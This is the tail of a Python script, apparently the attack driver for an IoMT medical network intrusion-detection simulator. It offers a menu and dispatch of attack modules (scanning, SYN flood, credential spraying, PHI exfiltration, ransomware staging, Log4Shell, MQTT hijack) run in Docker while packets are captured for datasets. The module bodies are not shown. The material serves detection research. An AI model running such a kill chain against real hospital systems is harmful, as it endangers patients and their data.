        "recon":       ("A01: Aggressive Reconnaissance Sweep",      "NMAP T4 scan — IT & Clinical zones"),
        "dos":         ("A21: SYN Flood Denial of Service",          "hping3 flood — PACS Server"),
        "brute_force": ("A04: Brute Force Login Attack",             "SSH/HTTPS credential spray — AD & EHR"),
        "lateral":     ("A17: East-West Lateral Movement",           "Pivot from IT → Clinical/Imaging/IoMT"),
        "exfil":       ("A14/A20: Data Exfiltration",                "Enumerate, stage, exfiltrate PHI"),
        "hl7_flood":   ("A16: HL7 Message Flood",                    "TCP flood of malformed HL7 ADT msgs"),
        "ble_replay":  ("A11: BLE Telemetry Replay",                 "Spoofed vital-sign replay to IoMT agg"),
        "ransomware":  ("A25: ALPHV Ransomware [CVE-2019-19781]",    "6-stage: VPN→AD→backup→exfil→encrypt"),
        "log4shell":   ("A26: Log4Shell RCE [CVE-2021-44228]",       "JNDI probe→LDAP callback→RCE→PHI read"),
        "mqtt_hijack": ("A27: MQTT IoMT Hijack [CVE-2023-28369]",    "Subscribe#→intercept→cmd inject→retain"),
    }

    print(f"\n{Y}╔{'═'*62}╗")
    print(f"║     🏥 IoMT Physical Attack Detonator — Module Menu      ║")
    print(f"╠{'═'*62}╣{RST}")
    for i, (key, (title, desc)) in enumerate(attack_info.items(), 1):
        cve = M if key in ("ransomware", "log4shell", "mqtt_hijack") else W
        tag = f" {M}[CVE]{RST}" if key in ("ransomware", "log4shell", "mqtt_hijack") else ""
        print(f"  {Y}[{i:2d}]{RST} {cve}{title}{RST}{tag}")
        print(f"       {DIM}{desc}{RST}")
    print(f"  {Y}[11]{RST} Execute ALL modules (full APT kill-chain)")
    print(f"  {Y}[ 0]{RST} Exit")
    print(f"{Y}╚{'═'*62}╝{RST}")

    choice = input(f"\n{C}Select module(s) [comma-separated, e.g. 1,3,8]: {RST}").strip()
    if choice == "0":
        return []
    if choice == "11":
        return ATTACK_MODULES[:]

    selected = []
    keys = list(attack_info.keys())
    for c in choice.split(","):
        c = c.strip()
        if c.isdigit() and 1 <= int(c) <= len(keys):
            selected.append(keys[int(c) - 1])
    return selected


# ══════════════════════════════════════════════════════════════
# Module Dispatch
# ══════════════════════════════════════════════════════════════
ATTACK_DISPATCH = {
    "recon":       execute_recon_attack,
    "dos":         execute_dos_attack,
    "brute_force": execute_brute_force_attack,
    "lateral":     execute_lateral_movement,
    "exfil":       execute_exfiltration,
    "hl7_flood":   execute_hl7_flood,
    "ble_replay":  execute_ble_replay,
    "ransomware":  execute_ransomware_staging,
    "log4shell":   execute_log4shell_simulation,
    "mqtt_hijack": execute_mqtt_hijack,
}


def print_killchain_summary(selected: list, elapsed: float):
    """Print a structured kill-chain summary after execution."""
    bar = "─" * 58
    print(f"\n{G}┌{bar}┐")
    print(f"│  ✅  KILL-CHAIN EXECUTION SUMMARY                      │")
    print(f"├{bar}┤")
    print(f"│  Modules Executed: {len(selected):<38d}│")
    print(f"│  Total Time:       {elapsed:.1f}s{'':<35s}│")
    print(f"├{bar}┤")
    for i, m in enumerate(selected, 1):
        disp_name = next((t for k, (t, _) in {
            "recon": ("A01 Recon", ""), "dos": ("A21 DoS", ""),
            "brute_force": ("A04 Brute Force", ""), "lateral": ("A17 Lateral", ""),
            "exfil": ("A14 Exfil", ""), "hl7_flood": ("A16 HL7 Flood", ""),
            "ble_replay": ("A11 BLE Replay", ""), "ransomware": ("A25 ALPHV Ransomware", ""),
            "log4shell": ("A26 Log4Shell", ""), "mqtt_hijack": ("A27 MQTT Hijack", ""),
        }.items() if k == m), m)
        print(f"│  {i:2d}. {disp_name:<54s}│")
    print(f"├{bar}┤")
    print(f"│  PCAP output → output_datasets/                        │")
    print(f"│  Analyse:   wireshark <pcap>  |  tshark -r <pcap>      │")
    print(f"└{bar}┘{RST}")


def main():
    parser = argparse.ArgumentParser(
        description="IoMT Physical Docker Attack Detonator (World 2)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Classic modules:  recon | dos | brute_force | lateral | exfil | hl7_flood | ble_replay
CVE-based:        ransomware (A25) | log4shell (A26) | mqtt_hijack (A27)
Combos:           all | menu

Threat profiles:  --profile apt28 | alphv | lazarus | generic_iot

Examples:
  python scripts/docker_attacker.py --attack recon
  python scripts/docker_attacker.py --attack ransomware --profile alphv
  python scripts/docker_attacker.py --attack log4shell,mqtt_hijack
  python scripts/docker_attacker.py --attack all
  python scripts/docker_attacker.py --attack menu
        """
    )
    parser.add_argument("--attack", default="all",
                        help="Attack module(s). Comma-separated, 'all', or 'menu'.")
    parser.add_argument("--capture-name", default="physical_attack_sample.pcap",
                        help="Output filename for the extracted PCAP.")
    parser.add_argument("--profile", default=None, choices=list(THREAT_PROFILES.keys()),
                        help="Threat actor profile to use (overrides --attack module list).")
    parser.add_argument("--no-capture", action="store_true",
                        help="Skip tcpdump capture (useful for quick tests).")

    args = parser.parse_args()

    print(f"\n{Y}{'═'*64}")
    print(f"  🏥 IoMT Medical NIDS Simulator — World 2: Physical Detonator")
    print(f"{'═'*64}{RST}")

    # Profile overrides module selection
    if args.profile:
        print_profile(args.profile)
        selected = THREAT_PROFILES[args.profile]["modules"]
        print(f"\n{C}▶ Using profile modules: {', '.join(selected)}{RST}")
    elif args.attack == "menu":
        selected = interactive_menu()
        if not selected:
            print(f"{Y}No modules selected. Exiting.{RST}")
            return
    elif args.attack == "all":
        selected = ATTACK_MODULES[:]
    else:
        selected = [s.strip() for s in args.attack.split(",") if s.strip() in ATTACK_DISPATCH]

    if not selected:
        _err(f"No valid attack modules in '{args.attack}'.")
        print(f"  Valid options: {', '.join(ATTACK_MODULES)}, all, menu")
        sys.exit(1)

    print(f"\n{C}Selected modules ({len(selected)}): {', '.join(selected)}{RST}")

    check_containers()
    setup_environment()
    if not args.no_capture:
        start_capture()

    t0 = time.time()
    try:
        for i, module in enumerate(selected):
            if i > 0:
                print(f"\n  {DIM}── Pausing 3 seconds between attack stages... ──{RST}")
                time.sleep(3)
            func = ATTACK_DISPATCH.get(module)
            if func:
                func()
            else:
                _warn(f"Unknown module: {module}")

    except KeyboardInterrupt:
        print(f"\n{Y}[!] Attack interrupted. Extracting partial PCAP...{RST}")

    finally:
        if not args.no_capture:
            stop_capture_and_extract(args.capture_name)
        print_killchain_summary(selected, time.time() - t0)


if __name__ == "__main__":
    main()

